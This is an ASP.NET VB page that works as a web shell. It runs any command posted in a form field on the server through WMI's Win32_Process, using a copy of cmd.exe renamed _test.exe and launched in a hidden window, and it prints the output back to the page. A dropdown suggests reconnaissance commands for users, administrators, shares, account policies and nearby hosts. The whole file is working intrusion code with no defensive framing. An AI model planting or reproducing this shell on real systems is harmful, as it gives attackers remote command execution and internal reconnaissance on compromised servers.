<%@ Page Language="VB" autoeventwireup="false" Src="../../scripts_archive.vb" Inherits="Scripts_Archive" Debug="true" %>


<%
	dim szCMD
	dim oFileSys = Server.CreateObject("Scripting.FileSystemObject")		
	dim szTempFile = Environment.GetEnvironmentVariable("TEMP") & "\test.txt"

	If Request.Form(".CMD") = "" Then
		szCMD = "dir c:\"	
	else 
		szCMD = Request.Form(".CMD")
	End If	  
  
	execute_command(szCMD,szTempFile)	 
%>
	<html>
	<head>
		<% Link_to_style_sheet%>
	</head>
	<body>
<b>Example of a server based Command Prompt (shell) using WMI's Win32_Process</b><br>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
&nbsp;<table border="0" cellpadding="0" cellspacing="0" width="100%" id="AutoNumber1">
  <tr>
    <td width="50%"><b>Command to execute:<br>
    </b> <input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run"> </td>
    <td width="50%"><b>Sample commands</b> (this list is not dynamic, you will need to type the command on the text box on the right)<br>
    <select size="1" name="D1">
    <option>"dir c:\" - lists the contents of the C:\ drive</option>
    <option>"calcs c:\" -     Security permissions on the C:\ drive</option>
    <option>"ipconfig" - Network configuration </option>
    <option>"net users" - List of users</option>
    <option>"net share" - List of shares</option>
    <option>"net localgroup administrators" - </option>
    <option>"net accounts" - Account Policies </option>
    <option>"net view" - Surrouding computers/Servers</option>
    <option>"net config server" - server configuration</option>
    <option>"route print" - Network routes</option>
    <option>"at" - Scheduled Events (AT)*</option>
    </select></td>
  </tr>
</table>
</FORM>
<br>
<b>results:</b><br>
<Pre><%
	Output_temp_file(szTempFile,oFileSys)	
%> 
</Pre>
</BODY></HTML>

<script runat=server>
	function execute_command(cmd_to_execute, szTempFile)
			
		Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
		Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
		local_dir = left(request.servervariables("PATH_TRANSLATED"),inStrRev(request.servervariables("PATH_TRANSLATED"),"\"))
		local_copy_of_cmd = Local_dir+"cmd.exe"
		Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp")+"\_test.exe"

		' Copy CMD.EXE to temp directory

		objProcessInfo = winObj.ExecQuery("Select * from Cim_Datafile where name='"+replace(local_copy_of_cmd,"\","\\")+"'") 
		for each item in objProcessInfo	
			item.copy(Target_copy_of_cmd)
		next

		' Execute Command and save results in temp file	
		
		objStartup = winObj.get("Win32_ProcessStartup")
		objConfig = objStartup.SpawnInstance_
		objConfig.ShowWindow = 12 ' HIDDEN_WINDOW const
		objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")

		errReturn = objProcess.Create(Target_copy_of_cmd + " /c " + cmd_to_execute + "  > " + szTempFile,,objConfig,intProcessID)
		rw(errReturn)
		' Wait for process to finish

		objProcessInfo = winObj.ExecQuery("Select * from Win32_Process where ProcessID="+str(intProcessID))						
		do while objProcessInfo.Count > 0
			sleep(5)
			objProcessInfo = winObj.ExecQuery("Select * from Win32_Process where ProcessID="+str(intProcessID))						
		loop	

		' Delete CMD.EXE from temp directory

		objProcessInfo = winObj.ExecQuery("Select * from Cim_Datafile where name='"+replace(Target_copy_of_cmd,"\","\\")+"'") 
		for each item in objProcessInfo	
		'	item.delete		
		next

	end function
	
	sub Output_temp_file(szTempFile,oFileSys)
		' -- Read the output from our command and remove the temp file -- '
	
	    On Error Resume Next 

		dim oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
	
   		Response.Write (Server.HTMLEncode(oFile.ReadAll))
   		oFile.Close
   		Call oFileSys.DeleteFile(szTempFile, True)
		 
	end sub
    </script>